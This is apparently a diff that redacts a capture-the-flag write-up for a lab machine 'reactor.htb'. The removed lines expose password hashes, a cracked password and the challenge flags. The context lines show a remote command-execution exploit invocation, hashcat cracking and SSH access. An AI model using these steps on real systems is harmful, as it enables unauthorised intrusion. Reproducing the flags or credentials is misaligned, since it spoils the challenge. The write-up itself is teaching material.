@@ -57,8 +57,8 @@ python exploit.py -u http://10.129.105.11:3000 -c "sqlite3 reactor.db .dump" --l
 Extracted the `users` table:
 
 ```sql
-INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
-INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
+INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ad##########','administrator','admin@reactor.htb');
+INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a6863###########','operator','engineer@reactor.htb');
 ```
 
 Cracked the MD5 hashes with hashcat:
@@ -67,7 +67,7 @@ Cracked the MD5 hashes with hashcat:
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Result: `engineer:reactor1`
+Result: `engineer:########`
 
 Successful SSH login:
 
@@ -100,8 +100,8 @@ Successful execution as root, confirming full privilege escalation.
 
 ## Flags
 
-- User: `c0d1e6c23e28b9ffe9f43be0379939ad`
-- Root: `cf7fe87eb3e229f42ef20bc3feeb3002`
+- User: `c0d1e6c23e28b9ffe9##############`
+- Root: `cf7fe87eb3e229f42e##############`
 
 ## Lessons Learned
 
